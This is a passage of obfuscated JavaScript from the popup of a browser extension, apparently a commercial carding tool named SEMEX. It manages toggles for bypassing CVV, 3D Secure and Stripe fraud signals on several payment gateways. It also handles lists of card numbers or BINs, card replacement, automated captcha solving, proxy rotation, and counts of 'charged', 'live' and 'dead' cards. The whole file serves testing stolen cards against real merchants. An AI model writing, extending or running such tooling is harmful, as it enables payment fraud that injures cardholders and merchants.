          detectedAt: Date.now(),
        };
        try { await chrome.storage.local.set({ __xugr: info }); } catch (_e) {}
        _semexShowUpgradeModal(info);
      }
    } catch (_e) {}
    return resp;
  };
})();


function setupTabs() {
  const _0x4bc6be = document.querySelectorAll(".tabs .tab");
  const _0x423076 = document.querySelectorAll(".tab-panel");
  if (!_0x4bc6be.length || !_0x423076.length) {
    return;
  }
  _0x4bc6be.forEach(_0x563477 => {
    _0x563477.addEventListener("click", () => {
      const _0x1c5cb3 = _0x563477.dataset.tab;
      _0x4bc6be.forEach(_0x335537 => _0x335537.classList.remove("active"));
      _0x423076.forEach(_0x4e206c => _0x4e206c.classList.remove("active"));
      _0x563477.classList.add("active");
      const _0x2c36f2 = document.getElementById(_0x1c5cb3 + "-tab");
      if (_0x2c36f2) {
        _0x2c36f2.classList.add("active");
      }
      if (_0x1c5cb3 === "admin" && typeof window.loadAdminPanel === "function") {
        window.loadAdminPanel();
        if (typeof window.loadAdminExtras === "function") window.loadAdminExtras();
        if (typeof window.loadReleasesPanel === "function") window.loadReleasesPanel();
      }
      if (_0x1c5cb3 === "bins" && typeof window.loadSavedBinsPanel === "function") {
        window.loadSavedBinsPanel();
      }
    });
  });
}
__name(setupTabs, "setupTabs");
function updateCCListCounter() {
  const _0x4cd64b = document.getElementById("cc-list-input");
  const _0x1a47d5 = document.getElementById("cc-list-counter");
  if (!_0x4cd64b || !_0x1a47d5) {
    return;
  }
  const _0x2be42c = _0x4cd64b.value.trim();
  const _0x2f4717 = _0x2be42c ? _0x2be42c.split("\n").filter(_0x36029e => _0x36029e.trim().length > 0) : [];
  const _0x21847e = _0x2f4717.length;
  if (_0x21847e === 0) {
    _0x1a47d5.innerHTML = "";
    _0x1a47d5.textContent = "❌ Empty";
    _0x1a47d5.className = "cc-badge empty";
    return;
  }
  // Compute the brand mix (visa/mc/amex/discover/etc) using the shared detector.
  const detect = window.semexDetectBrand;
  const svg = window.semexBrandSVG || {};
  const counts = Object.create(null);
  for (const line of _0x2f4717) {
    const pan = (line.split("|")[0] || "").replace(/\s+/g, "");
    const b = detect ? detect(pan) : "unknown";
    counts[b] = (counts[b] || 0) + 1;
  }
  // Deterministic order (major networks first).
  const order = ["visa", "mastercard", "amex", "discover", "jcb", "diners", "unionpay", "maestro", "unknown"];
  const parts = [];
  for (const k of order) {
    if (counts[k]) {
      const logo = svg[k] || svg.unknown || "";
      parts.push('<span class="cc-mix-part" title="' + k.toUpperCase() + '">' + logo + '<b>' + counts[k] + '</b></span>');
    }
  }
  _0x1a47d5.className = "cc-badge cc-mix";
  _0x1a47d5.innerHTML = parts.join('<span class="cc-mix-dot">·</span>');
}
__name(updateCCListCounter, "updateCCListCounter");
// Keep the CC List textarea in sync with settings — the tried-card auto-remove
// writes to storage from the content-script side and we want the user to SEE
// their list shrink live.
(function _semexCcListStorageSync() {
  try {
    if (window.__semexCcListSyncInstalled) return;
    window.__semexCcListSyncInstalled = true;
    chrome.storage.onChanged.addListener((ch, area) => {
      if (area !== "local" || !ch.settings) return;
      try {
        const ta = document.getElementById("cc-list-input");
        if (!ta) return;
        const nv = ch.settings.newValue || {};
        const newList = ((nv.binOrCCList || {}).ccList) || "";
        if (newList !== ta.value) {
          // Preserve focus/selection so user typing isn't clobbered.
          const isFocused = document.activeElement === ta;
          ta.value = newList;
          try { ta.dispatchEvent(new Event("input", { bubbles: true })); } catch (e) {}
          if (isFocused) { try { ta.focus(); } catch (e) {} }
        }
      } catch (e) {}
    });
  } catch (e) {}
})();
function checkCardReplacementWarning() {
  const _0x1083cb = document.getElementById("card-replacement-toggle");
  const _0x5dc5dc = document.getElementById("card-replacement-hint");
  const _0x55d44a = document.getElementById("bin-input");
  const _0x593b7c = document.getElementById("cc-list-input");
  const _0x2e1a71 = document.getElementById("bin-mode-btn").classList.contains("active");
  if (!_0x1083cb || !_0x5dc5dc) {
    return;
  }
  const _0x354b96 = _0x1083cb.checked;
  let _0x120bd4 = false;
  if (_0x2e1a71) {
    _0x120bd4 = _0x55d44a && _0x55d44a.value.trim().length >= 6;
  } else {
    const _0x5dae28 = _0x593b7c ? _0x593b7c.value.trim().split("\n").filter(_0x3634dd => _0x3634dd.trim().length > 0) : [];
    _0x120bd4 = _0x5dae28.length > 0;
  }
  if (_0x354b96 && !_0x120bd4) {
    showElement(_0x5dc5dc, "block");
  } else {
    hideElement(_0x5dc5dc);
  }
}
__name(checkCardReplacementWarning, "checkCardReplacementWarning");
async function loadStatistics() {
  try {
    const _0x5aef1b = await chrome.storage.local.get(["statistics"]);
    const _0x40a641 = _0x5aef1b.statistics || {
      totalCards: 0,
      attempts: 0,
      charged: 0,
      ccnLive: 0,
      dead: 0
    };
    const _0x4a5c9b = _0x40a641.charged || 0;
    const _0x228a04 = _0x40a641.ccnLive || 0;
    const _0x420ad4 = _0x40a641.dead || 0;
    // "Attempts" = every try. Fallback to sum for legacy stats without the field.
    const _0x53578a = (typeof _0x40a641.attempts === "number")
      ? _0x40a641.attempts
      : (_0x4a5c9b + _0x228a04 + _0x420ad4);
    document.getElementById("total-cards").textContent = _0x53578a;
    document.getElementById("stats-charged").textContent = _0x4a5c9b;
    document.getElementById("stats-ccn").textContent = _0x228a04;
    document.getElementById("stats-dead").textContent = _0x420ad4;
  } catch (_0x38033b) {}
}
__name(loadStatistics, "loadStatistics");
chrome.storage.onChanged.addListener((_0x3f9a2b, _0x270009) => {
  if (_0x270009 === "local" && (_0x3f9a2b.statistics || _0x3f9a2b.transactionHistory)) {
    loadStatistics();
  }
});
document.addEventListener("DOMContentLoaded", async () => {
  try {
    const _0x37ee31 = chrome.runtime.getManifest();
    const _0x65391 = document.getElementById("version-text");
    if (_0x65391 && _0x37ee31.version) {
      _0x65391.textContent = "v" + _0x37ee31.version;
    }
  } catch (_0x1afdfa) {}
  // v2.3.6 — Instant paywall from cached flag BEFORE any dashboard render.
  // If the previous session flagged the extension outdated, block the popup
  // immediately (no network wait). The network re-check runs a bit later to
  // clear the flag if the user has since upgraded.
  try {
    const _sflag = await chrome.storage.local.get(["__xugr"]);
    if (_sflag && _sflag.semexUpgradeRequired && _sflag.semexUpgradeRequired.required) {
      _semexShowUpgradeModal(_sflag.semexUpgradeRequired);
    }
  } catch (_e) {}
  const _0x2bf7ac = localStorage.getItem("semex_logged_in") === "true";
  const _0x26bb8a = document.querySelector(".container");
  const _0x550cd0 = document.getElementById("auth-modal");
  if (_0x2bf7ac) {
    _0x26bb8a.classList.add("loaded");
    _0x550cd0.classList.remove("active");
    if (window.cacheManager) {
      try {
        const _0x265eac = await window.cacheManager.get("user_profile", {
          strategy: "local"
        });
        if (_0x265eac) {
          updateUserInfo(_0x265eac);
        }
      } catch (_0x1df871) {}
    }
  } else {
    _0x26bb8a.classList.add("loaded");
    _0x550cd0.classList.add("active");
  }
  initNotificationCenter();
  populateYearDropdown();
  await loadSettings();
  // Proactive extension-version check — hard-block the UI if outdated.
  try { await _semexCheckExtensionVersion(); } catch (_e) {}
  loadStatistics();
  // Cross-device sync: pull server-side state (stats + history) so this device
  // shows the same dashboard as the user's other logged-in devices.
  try {
    chrome.runtime.sendMessage({ type: "SEMEX_SYNC_PULL" }, () => {
      // reload UI after storage was hydrated
      try { loadStatistics(); } catch (_e) {}
      try { if (typeof loadHistory === "function") loadHistory(); } catch (_e) {}
    });
  } catch (_e) {}
  setupTabs();
  setupAuthListeners();
  setupSettingsListeners();
  setupGenerators();
  initMaintenanceRetry();
  initAnnouncementBanner();
  initNewsTab();
  initRedeemCode();
  if (window.serverClient) {
    await window.serverClient.init();
    const _0x30d853 = await window.serverClient.checkHealth();
    if (_0x30d853) {
      showStatus("Connected", "active");
      updateFooterStatus("connected");
      const _0x4fcc11 = await checkMaintenanceMode();
      if (_0x4fcc11) {
        return;
      }
      const [_0x1c6fd1, _0x54ead2, _0x254706, _0x207c4d] = await Promise.all([loadAnnouncement().catch(_0x441d23 => {
        return null;
      }), loadNewsFeed().catch(_0x44edbd => {
        return null;
      }), checkLoginStatus().catch(_0x35d594 => {
        return null;
      }), window.serverClient.checkVersion().catch(_0x2f283b => {
        return null;
      })]);
      if (_0x207c4d && _0x207c4d.updateAvailable) {
        NotificationManager.add(_0x207c4d.forceUpdate ? "error" : "info", "🆕 Update Available!", "v" + _0x207c4d.latestVersion + " is available. " + (_0x207c4d.changelog || "Click to update."), _0x207c4d.updateUrl);
        const _0x2449ef = document.getElementById("version-text");
        if (_0x2449ef) {
          _0x2449ef.textContent = "v" + _0x207c4d.currentVersion + " → v" + _0x207c4d.latestVersion;
          _0x2449ef.style.color = "#f59e0b";
          _0x2449ef.title = "Click to update";
          _0x2449ef.style.cursor = "pointer";
          _0x2449ef.onclick = () => window.open(_0x207c4d.updateUrl, "_blank");
        }
      }
    } else {
      showStatus("Offline", "inactive");
      updateFooterStatus("offline");
      NotificationManager.add("warn", "Server Unreachable", "Cannot connect to authentication server. Some features may be limited.");
    }
  } else {
    updateFooterStatus("offline", "Server Client Error");
    NotificationManager.add("error", "Initialization Error", "ServerClient not found. Extension may not work correctly.");
  }
});
async function loadSettings() {
  var _0x387495;
  var _0x5727e2;
  var _0x167cfc;
  var _0x5e682f;
  var _0x996f96;
  var _0x15c5e0;
  var _0x521a13;
  var _0x597935;
  var _0x8d186d;
  var _0x27725d;
  var _0x28960e;
  var _0x3eca2a;
  var _0x2e602f;
  var _0x42b4d5;
  var _0x4ca8bc;
  var _0x59208f;
  var _0x1a99b0;
  var _0x5d2609;
  var _0x3e1271;
  var _0x40c23c;
  var _0x36d913;
  var _0x134aac;
  var _0xb7d24f;
  var _0x581393;
  var _0x44a2d7;
  var _0x1aa535;
  var _0x3b4b9c;
  var _0x2e55f6;
  var _0x41ef48;
  var _0x336ac8;
  var _0x222517;
  var _0x4b421b;
  var _0x17a662;
  var _0x17bdab;
  var _0x9db3f4;
  var _0x2e38b0;
  var _0x4f3e49;
  var _0x501865;
  var _0x4b8722;
  var _0x1ec26f;
  var _0x14f1ac;
  var _0x2edc6b;
  var _0x7a1c2e;
  var _0x5e29c1;
  var _0x2a1442;
  var _0x3c1c21;
  var _0x3b3850;
  var _0xc43b74;
  var _0x3bebe9;
  var _0x56f49b;
  var _0x2367bd;
  var _0x47a06b;
  var _0x282c73;
  var _0x4f0947;
  var _0x17edb7;
  var _0x263e9b;
  var _0x4207d8;
  var _0x45542e;
  var _0x3c72d0;
  var _0x3ac59e;
  var _0x3489d8;
  var _0x247ca4;
  var _0xabb215;
  var _0x1f7085;
  var _0x1b5d18;
  var _0x43b52f;
  var _0x2f5ee3;
  var _0x5175ac;
  var _0x2399f9;
  var _0x174c93;
  var _0x267d6d;
  var _0x41118b;
  var _0x4067e2;
  var _0x59e8b0;
  const _0x1a6627 = await getSettings();
  const _0x4a8ae4 = ((_0x387495 = _0x1a6627.cvvBypass) == null ? undefined : _0x387495.enabled) ?? true;
  document.getElementById("cvv-bypass-toggle").checked = _0x4a8ae4;
  toggleSectionContent("cvv-bypass-content", _0x4a8ae4);
  document.getElementById("cvv-stripe").checked = ((_0x167cfc = (_0x5727e2 = _0x1a6627.cvvBypass) == null ? undefined : _0x5727e2.gateways) == null ? undefined : _0x167cfc.stripe) ?? true;
  document.getElementById("cvv-adyen").checked = ((_0x996f96 = (_0x5e682f = _0x1a6627.cvvBypass) == null ? undefined : _0x5e682f.gateways) == null ? undefined : _0x996f96.adyen) ?? true;
  document.getElementById("cvv-checkout").checked = ((_0x521a13 = (_0x15c5e0 = _0x1a6627.cvvBypass) == null ? undefined : _0x15c5e0.gateways) == null ? undefined : _0x521a13.checkout) ?? true;
  document.getElementById("cvv-recurly").checked = ((_0x8d186d = (_0x597935 = _0x1a6627.cvvBypass) == null ? undefined : _0x597935.gateways) == null ? undefined : _0x8d186d.recurly) ?? true;
  document.getElementById("cvv-xsolla").checked = ((_0x28960e = (_0x27725d = _0x1a6627.cvvBypass) == null ? undefined : _0x27725d.gateways) == null ? undefined : _0x28960e.xsolla) ?? true;
  const _0x14a222 = ((_0x3eca2a = _0x1a6627.paymentUserAgentBypass) == null ? undefined : _0x3eca2a.enabled) ?? true;
  document.getElementById("payment-user-agent-bypass-toggle").checked = _0x14a222;
  toggleSectionContent("payment-user-agent-bypass-content", _0x14a222);
  const _0x3fbced = ((_0x2e602f = _0x1a6627.threeDSBypass) == null ? undefined : _0x2e602f.enabled) ?? true;
  document.getElementById("three-ds-bypass-toggle").checked = _0x3fbced;
  toggleSectionContent("three-ds-bypass-content", _0x3fbced);
  const _0x15c781 = _0x1a6627.stripeSecurityBypass;
  const _0x3fd6aa = (_0x15c781 == null ? undefined : _0x15c781.enabled) ?? false;
  document.getElementById("stripe-security-bypass-toggle").checked = _0x3fd6aa;
  toggleSectionContent("stripe-security-bypass-content", _0x3fd6aa);
  document.getElementById("security-pasted").checked = (_0x15c781 == null ? undefined : _0x15c781.pasted) ?? true;
  document.getElementById("security-timing").checked = (_0x15c781 == null ? undefined : _0x15c781.timing) ?? true;
  document.getElementById("security-tracking").checked = (_0x15c781 == null ? undefined : _0x15c781.tracking) ?? true;
  document.getElementById("security-zip").checked = (_0x15c781 == null ? undefined : _0x15c781.zip) ?? true;
  const _0x2827e7 = ((_0x42b4d5 = _0x1a6627.cardReplacement) == null ? undefined : _0x42b4d5.enabled) ?? false;
  document.getElementById("card-replacement-toggle").checked = _0x2827e7;
  toggleSectionContent("card-replacement-content", _0x2827e7);
  document.getElementById("card-replacement-stripe").checked = ((_0x59208f = (_0x4ca8bc = _0x1a6627.cardReplacement) == null ? undefined : _0x4ca8bc.gateways) == null ? undefined : _0x59208f.stripe) ?? true;
  document.getElementById("card-replacement-adyen").checked = ((_0x5d2609 = (_0x1a99b0 = _0x1a6627.cardReplacement) == null ? undefined : _0x1a99b0.gateways) == null ? undefined : _0x5d2609.adyen) ?? true;
  document.getElementById("card-replacement-checkout").checked = ((_0x40c23c = (_0x3e1271 = _0x1a6627.cardReplacement) == null ? undefined : _0x3e1271.gateways) == null ? undefined : _0x40c23c.checkout) ?? true;
  document.getElementById("card-replacement-recurly").checked = ((_0x134aac = (_0x36d913 = _0x1a6627.cardReplacement) == null ? undefined : _0x36d913.gateways) == null ? undefined : _0x134aac.recurly) ?? true;
  document.getElementById("card-replacement-xsolla").checked = ((_0x581393 = (_0xb7d24f = _0x1a6627.cardReplacement) == null ? undefined : _0xb7d24f.gateways) == null ? undefined : _0x581393.xsolla) ?? true;
  const _0x3baee1 = ((_0x44a2d7 = _0x1a6627.binOrCCList) == null ? undefined : _0x44a2d7.mode) || "bin";
  if (_0x3baee1 === "bin") {
    document.getElementById("bin-mode-btn").classList.add("active");
    document.getElementById("cc-list-mode-btn").classList.remove("active");
    showElement(document.getElementById("bin-mode-content"), "block");
    hideElement(document.getElementById("cc-list-mode-content"));
  } else {
    document.getElementById("bin-mode-btn").classList.remove("active");
    document.getElementById("cc-list-mode-btn").classList.add("active");
    hideElement(document.getElementById("bin-mode-content"));
    showElement(document.getElementById("cc-list-mode-content"), "block");
  }
  document.getElementById("bin-input").value = ((_0x1aa535 = _0x1a6627.binOrCCList) == null ? undefined : _0x1aa535.bin) || "";
  document.getElementById("cvv-input").value = ((_0x3b4b9c = _0x1a6627.binOrCCList) == null ? undefined : _0x3b4b9c.cvv) || "";
  document.getElementById("cc-list-input").value = ((_0x2e55f6 = _0x1a6627.binOrCCList) == null ? undefined : _0x2e55f6.ccList) || "";
  updateCCListCounter();
  checkCardReplacementWarning();
  document.getElementById("expiry-month-select").value = ((_0x336ac8 = (_0x41ef48 = _0x1a6627.binOrCCList) == null ? undefined : _0x41ef48.expiry) == null ? undefined : _0x336ac8.month) || "RND";
  document.getElementById("expiry-year-select").value = ((_0x4b421b = (_0x222517 = _0x1a6627.binOrCCList) == null ? undefined : _0x222517.expiry) == null ? undefined : _0x4b421b.year) || "RND";
  const _0x597ac7 = ((_0x17a662 = _0x1a6627.captchaSolving) == null ? undefined : _0x17a662.enabled) ?? false;
  document.getElementById("captcha-solving-toggle").checked = _0x597ac7;
  toggleSectionContent("captcha-solving-content", _0x597ac7);
  document.getElementById("nopecha-api-key").value = ((_0x17bdab = _0x1a6627.captchaSolving) == null ? undefined : _0x17bdab.api_key) || "";
  updateNopechaStatus();
  document.getElementById("hcaptcha-enabled").checked = ((_0x2e38b0 = (_0x9db3f4 = _0x1a6627.captchaSolving) == null ? undefined : _0x9db3f4.hCaptcha) == null ? undefined : _0x2e38b0.enabled) ?? true;
  document.getElementById("hcaptcha-tap-based").checked = ((_0x501865 = (_0x4f3e49 = _0x1a6627.captchaSolving) == null ? undefined : _0x4f3e49.hCaptcha) == null ? undefined : _0x501865.tapBased) ?? true;
  try { const _h2c = document.getElementById("hcaptcha-2captcha"); if (_h2c) { const _hc = (_0x1a6627.captchaSolving || {}).hCaptcha || {}; _h2c.checked = _hc.use2Captcha ?? true; } } catch (_e) {}
  try { const _prov = document.getElementById("captcha-provider"); if (_prov) { _prov.value = ((_0x1a6627.captchaSolving || {}).provider) || "2captcha"; } } catch (_e) {}
  document.getElementById("hcaptcha-fallback-manual").checked = ((_0x1ec26f = (_0x4b8722 = _0x1a6627.captchaSolving) == null ? undefined : _0x4b8722.hCaptcha) == null ? undefined : _0x1ec26f.fallbackToManual) ?? true;
  toggleSectionContent("hcaptcha-content", ((_0x2edc6b = (_0x14f1ac = _0x1a6627.captchaSolving) == null ? undefined : _0x14f1ac.hCaptcha) == null ? undefined : _0x2edc6b.enabled) ?? true);
  document.getElementById("recaptcha-enabled").checked = ((_0x5e29c1 = (_0x7a1c2e = _0x1a6627.captchaSolving) == null ? undefined : _0x7a1c2e.recaptcha) == null ? undefined : _0x5e29c1.enabled) ?? false;
  document.getElementById("recaptcha-auto-open").checked = ((_0x3c1c21 = (_0x2a1442 = _0x1a6627.captchaSolving) == null ? undefined : _0x2a1442.recaptcha) == null ? undefined : _0x3c1c21.auto_open) ?? true;
  document.getElementById("recaptcha-auto-solve").checked = ((_0xc43b74 = (_0x3b3850 = _0x1a6627.captchaSolving) == null ? undefined : _0x3b3850.recaptcha) == null ? undefined : _0xc43b74.auto_solve) ?? true;
  toggleSectionContent("recaptcha-content", ((_0x56f49b = (_0x3bebe9 = _0x1a6627.captchaSolving) == null ? undefined : _0x3bebe9.recaptcha) == null ? undefined : _0x56f49b.enabled) ?? false);
  const _0x514435 = ((_0x2367bd = _0x1a6627.proxyManagement) == null ? undefined : _0x2367bd.enabled) ?? false;
  document.getElementById("proxy-rotation-toggle").checked = _0x514435;
  toggleSectionContent("rotation-settings", _0x514435);
  document.getElementById("auto-save-live").checked = ((_0x47a06b = _0x1a6627.proxyManagement) == null ? undefined : _0x47a06b.autoSaveLive) ?? true;
  document.getElementById("rotation-mode").value = ((_0x282c73 = _0x1a6627.proxyManagement) == null ? undefined : _0x282c73.rotationMode) || "sequential";
  document.getElementById("rotation-interval").value = ((_0x4f0947 = _0x1a6627.proxyManagement) == null ? undefined : _0x4f0947.rotationInterval) || 5;
  const _0x5115bf = ((_0x17edb7 = _0x1a6627.paymentTracking) == null ? undefined : _0x17edb7.enabled) ?? true;
  document.getElementById("payment-tracking-toggle").checked = _0x5115bf;
  toggleSectionContent("payment-tracking-content", _0x5115bf);
  document.getElementById("pt-stripe").checked = ((_0x4207d8 = (_0x263e9b = _0x1a6627.paymentTracking) == null ? undefined : _0x263e9b.gateways) == null ? undefined : _0x4207d8.stripe) ?? true;
  document.getElementById("pt-adyen").checked = ((_0x3c72d0 = (_0x45542e = _0x1a6627.paymentTracking) == null ? undefined : _0x45542e.gateways) == null ? undefined : _0x3c72d0.adyen) ?? true;
  document.getElementById("pt-checkout").checked = ((_0x3489d8 = (_0x3ac59e = _0x1a6627.paymentTracking) == null ? undefined : _0x3ac59e.gateways) == null ? undefined : _0x3489d8.checkout) ?? true;
  document.getElementById("pt-recurly").checked = ((_0xabb215 = (_0x247ca4 = _0x1a6627.paymentTracking) == null ? undefined : _0x247ca4.gateways) == null ? undefined : _0xabb215.recurly) ?? true;
  document.getElementById("pt-xsolla").checked = ((_0x1b5d18 = (_0x1f7085 = _0x1a6627.paymentTracking) == null ? undefined : _0x1f7085.gateways) == null ? undefined : _0x1b5d18.xsolla) ?? true;
  document.getElementById("pt-show-toast").checked = ((_0x43b52f = _0x1a6627.paymentTracking) == null ? undefined : _0x43b52f.showToast) ?? true;
  document.getElementById("pt-only-success").checked = ((_0x2f5ee3 = _0x1a6627.paymentTracking) == null ? undefined : _0x2f5ee3.onlySuccess) ?? false;
  document.getElementById("pt-dismiss-time").value = ((_0x5175ac = _0x1a6627.paymentTracking) == null ? undefined : _0x5175ac.dismissTime) || 5;
  document.getElementById("form-filling-toggle").checked = ((_0x2399f9 = _0x1a6627.formFilling) == null ? undefined : _0x2399f9.enabled) !== false;
  document.getElementById("form-filling-custom-email").value = ((_0x174c93 = _0x1a6627.formFilling) == null ? undefined : _0x174c93.customEmail) || "support@semex.pro";
  document.getElementById("form-filling-random-email").checked = ((_0x267d6d = _0x1a6627.formFilling) == null ? undefined : _0x267d6d.randomEmail) ?? false;
  document.getElementById("form-filling-custom-name").value = ((_0x41118b = _0x1a6627.formFilling) == null ? undefined : _0x41118b.customName) || "SEMEX";
  document.getElementById("form-filling-random-name").checked = ((_0x4067e2 = _0x1a6627.formFilling) == null ? undefined : _0x4067e2.randomName) ?? false;
  document.getElementById("screenshot-save-locally").checked = ((_0x59e8b0 = _0x1a6627.screenshot) == null ? undefined : _0x59e8b0.saveLocally) !== false;
  const _celConfEl = document.getElementById("celebration-confetti");
  const _celSoundEl = document.getElementById("celebration-sound");
  if (_celConfEl) _celConfEl.checked = ((_0x1a6627.celebration || {}).confetti) !== false;
  if (_celSoundEl) _celSoundEl.checked = ((_0x1a6627.celebration || {}).sound) !== false;
  const _celVolEl = document.getElementById("celebration-volume");
  const _celVolLbl = document.getElementById("celebration-volume-value");
  if (_celVolEl) {
    const _vv = typeof (_0x1a6627.celebration || {}).volume === "number" ? (_0x1a6627.celebration || {}).volume : 100;
    _celVolEl.value = _vv;
    if (_celVolLbl) _celVolLbl.textContent = _vv + "%";
  }
  // FIX: hydrate the Screenshot Delay slider from settings (default 1000ms → slider position 10)
  const _0xssSliderEl = document.getElementById("screenshot-delay");
  const _0xssLabelEl = document.getElementById("screenshot-delay-value");
  if (_0xssSliderEl) {
    const _0xssMs = Number(_0x1a6627.screenshotDelay) || 800;
    const _0xssPos = Math.max(0, Math.min(30, Math.round(_0xssMs / 100)));
    _0xssSliderEl.value = _0xssPos;
    if (_0xssLabelEl) _0xssLabelEl.textContent = (_0xssPos / 10).toFixed(1) + "s";
  }
  document.getElementById("address-follow-proxy").checked = _0x1a6627.addressFollowProxy ?? false;
  const _0x35e072 = _0x1a6627.addressCountry || "US";
  const _0x1ddb38 = document.getElementById("address-country-select");
  const _0x477747 = document.getElementById("address-country-custom");
  const _0x34a491 = ["US", "UK", "CA", "AU", "DE", "FR", "RANDOM"];
  if (_0x34a491.includes(_0x35e072)) {
    _0x1ddb38.value = _0x35e072;
    _0x477747.style.display = "none";
  } else {
    _0x1ddb38.value = "CUSTOM";
    _0x477747.value = _0x35e072;
    _0x477747.style.display = "block";
  }
  document.getElementById("address-country-random").checked = _0x1a6627.addressCountryRandom ?? false;
}
__name(loadSettings, "loadSettings");
function setupSettingsListeners() {
  var _0x54f311;
  document.getElementById("cvv-bypass-toggle").addEventListener("change", async _0x2d5e1c => {
    await setSetting("cvvBypass.enabled", _0x2d5e1c.target.checked);
    toggleSectionContent("cvv-bypass-content", _0x2d5e1c.target.checked);
  });
  document.getElementById("cvv-stripe").addEventListener("change", async _0x3f8f7c => {
    await setSetting("cvvBypass.gateways.stripe", _0x3f8f7c.target.checked);
  });
  document.getElementById("cvv-adyen").addEventListener("change", async _0x185f2c => {
    await setSetting("cvvBypass.gateways.adyen", _0x185f2c.target.checked);
  });
  document.getElementById("cvv-checkout").addEventListener("change", async _0x5ed68b => {
    await setSetting("cvvBypass.gateways.checkout", _0x5ed68b.target.checked);
  });
  document.getElementById("cvv-recurly").addEventListener("change", async _0x38cc52 => {
    await setSetting("cvvBypass.gateways.recurly", _0x38cc52.target.checked);
  });
  document.getElementById("cvv-xsolla").addEventListener("change", async _0x479866 => {
    await setSetting("cvvBypass.gateways.xsolla", _0x479866.target.checked);
  });
  document.getElementById("payment-user-agent-bypass-toggle").addEventListener("change", async _0xf8109d => {
    await setSetting("paymentUserAgentBypass.enabled", _0xf8109d.target.checked);
    toggleSectionContent("payment-user-agent-bypass-content", _0xf8109d.target.checked);
  });
  document.getElementById("three-ds-bypass-toggle").addEventListener("change", async _0x24e07c => {
    // PREMIUM GATE — TRIAL/expired users cannot enable 3DS bypass. Admins pass.
    if (_0x24e07c.target.checked && !_semexHasPremiumOrAdmin()) {
      _0x24e07c.target.checked = false;
      _semexShowPremiumLock("3DS Bypass");
      return;
    }
    await setSetting("threeDSBypass.enabled", _0x24e07c.target.checked);
    toggleSectionContent("three-ds-bypass-content", _0x24e07c.target.checked);
  });
  document.getElementById("stripe-security-bypass-toggle").addEventListener("change", async _0x25b799 => {
    await setSetting("stripeSecurityBypass.enabled", _0x25b799.target.checked);
    toggleSectionContent("stripe-security-bypass-content", _0x25b799.target.checked);
  });
  document.getElementById("security-pasted").addEventListener("change", async _0x3dc638 => {
    await setSetting("stripeSecurityBypass.pasted", _0x3dc638.target.checked);
  });
  document.getElementById("security-timing").addEventListener("change", async _0x37437c => {
    await setSetting("stripeSecurityBypass.timing", _0x37437c.target.checked);
  });
  document.getElementById("security-tracking").addEventListener("change", async _0x39b4b5 => {
    await setSetting("stripeSecurityBypass.tracking", _0x39b4b5.target.checked);
  });
  document.getElementById("security-zip").addEventListener("change", async _0x4b46f4 => {
    await setSetting("stripeSecurityBypass.zip", _0x4b46f4.target.checked);
  });
  document.getElementById("card-replacement-toggle").addEventListener("change", async _0x26e116 => {
    await setSetting("cardReplacement.enabled", _0x26e116.target.checked);
    toggleSectionContent("card-replacement-content", _0x26e116.target.checked);
    checkCardReplacementWarning();
  });
  document.getElementById("card-replacement-stripe").addEventListener("change", async _0x518f4f => {
    await setSetting("cardReplacement.gateways.stripe", _0x518f4f.target.checked);
  });
  document.getElementById("card-replacement-adyen").addEventListener("change", async _0x2c5773 => {
    await setSetting("cardReplacement.gateways.adyen", _0x2c5773.target.checked);
  });
  document.getElementById("card-replacement-checkout").addEventListener("change", async _0x4b7083 => {
    await setSetting("cardReplacement.gateways.checkout", _0x4b7083.target.checked);
  });
  document.getElementById("card-replacement-recurly").addEventListener("change", async _0x1e8804 => {
    await setSetting("cardReplacement.gateways.recurly", _0x1e8804.target.checked);
  });
  document.getElementById("card-replacement-xsolla").addEventListener("change", async _0x522774 => {
    await setSetting("cardReplacement.gateways.xsolla", _0x522774.target.checked);
  });
  document.getElementById("bin-mode-btn").addEventListener("click", async () => {
    document.getElementById("bin-mode-btn").classList.add("active");
    document.getElementById("cc-list-mode-btn").classList.remove("active");
    showElement(document.getElementById("bin-mode-content"), "block");
    hideElement(document.getElementById("cc-list-mode-content"));
    await setSetting("binOrCCList.mode", "bin");
    checkCardReplacementWarning();
  });
  document.getElementById("cc-list-mode-btn").addEventListener("click", async () => {
    document.getElementById("bin-mode-btn").classList.remove("active");
    document.getElementById("cc-list-mode-btn").classList.add("active");
    hideElement(document.getElementById("bin-mode-content"));
    showElement(document.getElementById("cc-list-mode-content"), "block");
    await setSetting("binOrCCList.mode", "ccList");
    checkCardReplacementWarning();
  });
  document.getElementById("bin-input").addEventListener("change", async _0x1feffb => {
    await setSetting("binOrCCList.bin", _0x1feffb.target.value.trim());
    checkCardReplacementWarning();
  });
  // FIX: Save-BIN button → POST to /api/user/bins (cloud-synced across devices)
  const _0xSaveBinBtn = document.getElementById("save-bin-btn");
  if (_0xSaveBinBtn) {
    _0xSaveBinBtn.addEventListener("click", async () => {
      const _0xbinRaw = (document.getElementById("bin-input").value || "").trim();
      const _0xbinDigits = _0xbinRaw.replace(/\D/g, "").slice(0, 19);
      if (_0xbinDigits.length < 6) {
        showToast && showToast("BIN must be ≥6 digits", "error");
        return;
      }
      try {
        if (window.serverClient && window.serverClient._ready) { await window.serverClient._ready; }
        const _0xstored = await chrome.storage.local.get(["accessToken"]);
        if (!_0xstored.accessToken) { showToast && showToast("Login first", "error"); return; }
        _0xSaveBinBtn.disabled = true;
        const _0xbinResp = await window.serverClient.authedFetch("/api/user/bins", {
          method: "POST",
          body: JSON.stringify({ bin: _0xbinDigits })
        });
        if (_0xbinResp.status === 401) { showToast && showToast("Session expired — please log in again", "error"); return; }
        const _0xbinBody = await _0xbinResp.json().catch(() => ({}));
        if (_0xbinResp.ok && _0xbinBody.success) {
          showToast && showToast("BIN " + _0xbinDigits + " saved", "success");
        } else {
          showToast && showToast(_0xbinBody.detail || _0xbinBody.error || "Save failed", "error");
        }
      } catch (e) {
        showToast && showToast("Network error: " + (e && e.message ? e.message : e), "error");
      } finally {
        _0xSaveBinBtn.disabled = false;
      }
    });
  }
  // FIX: Screenshot Delay slider — persist to settings.screenshotDelay (in ms) and update label
  const _0xSsSlider = document.getElementById("screenshot-delay");
  const _0xSsLabel = document.getElementById("screenshot-delay-value");
  if (_0xSsSlider) {
    const _0xSsRender = (v) => {
      const seconds = (Math.max(0, Math.min(30, Number(v))) / 10).toFixed(1);
      if (_0xSsLabel) _0xSsLabel.textContent = seconds + "s";
    };
    _0xSsSlider.addEventListener("input", (e) => _0xSsRender(e.target.value));
    _0xSsSlider.addEventListener("change", async (e) => {
      const ms = Math.max(0, Math.min(30, Number(e.target.value))) * 100;
      await setSetting("screenshotDelay", ms);
    });
  }
  document.getElementById("cvv-input").addEventListener("change", async _0x1e2466 => {
